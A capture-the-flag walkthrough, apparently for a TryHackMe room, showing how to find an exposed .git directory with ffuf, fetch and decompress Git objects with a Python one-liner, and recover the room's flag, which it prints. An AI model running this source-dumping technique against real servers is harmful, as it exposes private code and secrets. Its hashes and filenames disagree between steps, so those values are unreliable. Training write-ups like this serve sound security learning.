# Room Access

**Target:**

```text
http://MACHINE_IP:8080
```

## 1. Objectives

- Dump the exposed source code.
- Find the flag.

---

## 2. Directory Enumeration

I started by performing directory enumeration with **ffuf**.

```bash
ffuf -u http://MACHINE_IP:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

The scan revealed an exposed `.git` directory:

```text
.git/HEAD
```

This is interesting because an exposed Git repository may contain the application's source code and previous commits.

---

## 3. Inspecting the Exposed Git Repository

I opened:

```text
http://MACHINE_IP:8080/.git/HEAD
```

and:

```text
http://MACHINE_IP:8080/.git/
```

The `.git/` directory exposed several Git files and directories:

```text
COMMIT_EDITMSG
HEAD
branches/
config
description
hooks/
index
info/
logs/
objects/
refs/
```

Since `HEAD` did not immediately reveal anything useful, I started checking the other Git files and directories.

---

## 4. Inspecting Git Logs

I found useful information in:

```text
.git/logs/refs/heads/main
```

The log contained a commit similar to:

```text
0f135504cb13e?630c61d5b342c532d21e45bda night-shift <devabyte-lotus.internal> 1762049640 commit (initial): initial Byte Lotus guest platform
```

The important part is the commit hash:

```text
0f135504cb13e?630c61d5b342c532d21e45bda
```

The exact hash should be taken directly from the exposed Git log.

Git stores objects using the first two characters of the SHA-1 hash as the directory name.

Therefore, for the commit object, I accessed:

```text
/.git/objects/0f/135504cb13e?630c61d5b342c532d21e45bda
```

I downloaded the object for further analysis.

---

## 5. Identifying the Git Object

I used the `file` command on the downloaded object:

```bash
file 13550b4cb13e9f30c61d5b342c532d21e45bda
```

The result showed:

```text
zlib compressed data
```

Git objects are compressed using **zlib**, so I decompressed the object with Python:

```bash
python3 -c "import zlib; print(zlib.decompress(open('13550b4cb13e9f30c61d5b342c532d21e45bda','rb').read()))"
```

The decompressed data was a Git **commit object**.

It contained the following tree hash:

```text
fa45dbd69394ea9e13683d9efb6a0220daac59d4
```

---

## 6. Accessing the Tree Object

Using the same Git object structure, I accessed:

```text
/.git/objects/fa/45dbd69394ea9e13683d9efb6a0220daac59d4
```

After downloading and decompressing this object, I found references to several files, including:

```text
README.md
app.js
index.html
```

The output looked similar to:

```text
README.md\x00\xa5\x96\\X\x0f\xee\x91\xd8R\xe5\xb1\x9a....
app.js\x00%u\xab\x07?gaZ'\x13Vc\xedбyL-%\.....
index.html\x00\n\x12\xca\xa4\xe5*\x96^\x89\xe5\xec\xcfW`...
```

The hexadecimal-looking values following the filenames are Git object hashes.

---

## 7. Extracting `README.md`

The `README.md` entry pointed to an object beginning with:

```text
a5/965c...
```

I accessed the corresponding Git object under:

```text
/.git/objects/a5/965c...
```

After downloading it, I decompressed it using the same Python command:

```bash
python3 -c "import zlib; print(zlib.decompress(open('965c...','rb').read()))"
```

The decompressed content contained the flag.

---

## 8. Flag

The recovered flag is:

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## 9. Attack Chain

The complete process can be summarized as:

```text
MACHINE_IP:8080
       │
       ▼
Directory Enumeration
       │
       ▼
Exposed /.git/
       │
       ▼
.git/logs/refs/heads/main
       │
       ▼
Recover Commit Hash
       │
       ▼
.git/objects/<commit>
       │
       ▼
zlib Decompression
       │
       ▼
Recover Tree Hash
       │
       ▼
.git/objects/<tree>
       │
       ▼
Find README.md Object
       │
       ▼
zlib Decompression
       │
       ▼
Recover Flag
       │
       ▼
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## 10. Key Takeaways

- Directory enumeration can reveal accidentally exposed version-control directories.
- An exposed `.git` directory can disclose source code and historical commits.
- Git objects are stored using SHA-1-based paths under `.git/objects/`.
- Git objects are zlib-compressed.
- Commit objects reference tree objects.
- Tree objects contain filenames and references to blob objects.
- Blob objects can contain source code, configuration files, or sensitive information.

The main vulnerability in this challenge is the **exposed `.git` repository**, which allowed the application's source files and Git history to be recovered.

---

## Flag

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```
